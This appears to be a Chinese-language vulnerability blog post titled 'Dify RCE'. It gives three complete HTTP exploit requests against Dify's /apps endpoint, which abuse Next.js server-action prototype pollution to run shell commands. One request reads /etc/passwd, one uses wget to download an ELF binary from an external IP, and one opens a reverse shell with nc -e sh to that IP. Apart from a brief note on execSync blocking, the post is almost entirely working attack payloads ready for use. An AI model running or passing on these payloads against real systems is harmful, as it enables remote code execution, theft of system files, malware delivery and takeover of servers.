---
title: Dify RCE
published: 2025-12-25 14:09
tags: [漏洞]
category: Web
draft: false
---

注意事项：在验证漏洞是否存在过程中，应尽量避免使用 execSync函数执行，这样可能造成系统阻塞的命令(如ping，curl，wget等)，因为Node.js是单线程事件循环模型，execSync会阻塞整个事件循环导致所有请求都被阻塞。推荐使用异步 exec（下面的poc仍然使用的是execSync函数）

## 1、查看文件

```
POST /apps HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 710
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
X-Nextjs-Html-Request-Id: lMx9dPL6FzXWOlwazZgjx
X-Nextjs-Request-Id: bafo0gfl
Accept-Encoding: gzip, deflate, br

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(cat /etc/passwd)').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

## 2、下载文件

```
POST /apps HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 729
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
X-Nextjs-Html-Request-Id: lMx9dPL6FzXWOlwazZgjx
X-Nextjs-Request-Id: bafo0gfl
Accept-Encoding: gzip, deflate, br

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(wget 43.142.109.146:19998/dify.elf)').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

## 3、反弹shell

```
POST /apps HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 724
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Next-Action: x
X-Nextjs-Html-Request-Id: lMx9dPL6FzXWOlwazZgjx
X-Nextjs-Request-Id: bafo0gfl
Accept-Encoding: gzip, deflate, br

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(nc 43.142.109.146 19999 -e sh)').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

